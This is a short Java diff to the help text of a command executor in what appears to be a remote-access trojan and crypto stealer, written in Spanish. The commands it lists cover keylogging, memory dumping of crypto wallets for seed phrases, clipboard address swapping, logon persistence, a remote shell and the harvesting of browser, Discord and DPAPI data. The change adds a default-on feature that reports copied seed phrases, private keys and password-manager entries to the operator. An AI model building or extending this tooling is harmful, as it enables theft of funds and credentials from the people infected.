@@ -94,7 +94,8 @@ public final class CommandExecutor {
 			"Archivos y shell: `ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (máx. 128 MB, por partes) · `upload <url|adjunto> [nombre]` · `shell <cmd>` (60 s, salida larga como .txt)",
 			"Carteras: `wallet watch on|off|status` · `memdump [electrum|phantom|ledger|exodus|metamask|trust|coinbase|pid]` vuelca memoria y busca seeds sin contraseña",
 			"Teclado: `keys on|off [--hard]|status|dump` hook nativo; las contraseñas llegan con proceso y ventana",
-			"Portapapeles: `clip read|on|off|status` · `addr add|list|del|clear <coin> <dirección>` validación estricta y rotación",
+			"Portapapeles: `clip read|on|off|status` y `clip secrets on|off` · `addr add|list|del|clear <coin> <dirección>` validación estricta y rotación",
+			"Los secretos copiados (seed BIP39, xprv, clave EVM/Solana o contraseña de un gestor) se avisan solos con `clip secrets on`, por defecto activo.",
 			"Agente: `persist on|off` tarea de logon · `sleep <s>` · `update [check|stage|apply <version>|rollback|auto on|off|status]` · `gateway status|restart` · `clear [1-1000]` mensajes del canal · `kill` cierra el agente",
 			"Harvest: accounts, browsers, Discord, wallets, DPAPI y game. La primera ejecución ya envía recon, sesiones y carteras; `hives` es el fallback manual.",
 			"Extras y reparaciones: SHELL.md en el repo.");
